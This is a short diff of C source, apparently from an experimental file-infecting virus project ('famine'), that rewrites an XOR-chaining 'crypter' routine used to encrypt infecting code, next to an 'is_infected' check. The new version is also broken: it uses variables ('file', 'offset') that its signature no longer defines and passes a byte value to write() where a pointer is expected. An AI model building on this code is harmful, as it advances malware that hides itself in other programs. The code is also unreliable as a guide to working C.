@@ -49,24 +49,19 @@ void decrypter(unsigned long address_of_main)
 }
 
 // 
-// to adapt with write
+// merge to famine and test
 // 
-void crypter(t_file file, unsigned long address_of_main)
+void crypter(char *read, size_t size, char key, int fd)
 {
-	size_t	size;
-	size_t	offset;
-	char	*start;
+	char tab[]= {0,0};
 
-	// printf(“%p\n”,get_eip() - ((char )&yeah - (char )&crypter));
-	offset = *(int *)(address_of_main - 4 + sizeof(offset));
-	size = *(int *)(address_of_main - 4);
 	if(size && is_infected(file->data))
 	{
-		start[offset + size] ^= *(int *)(address_of_main - 4);
+		write(fd, (tab[size % 2] = (read[size] ^ key)), 1);
 		size--;
 		while (size)
 		{
-			start[offset + size] ^= start[offset + size - 1];
+			write(fd, (tab[size % 2] = (read[offset + size] ^ tab[(size - 1) % 2])), 1);
 			size--;
 		}
 	}
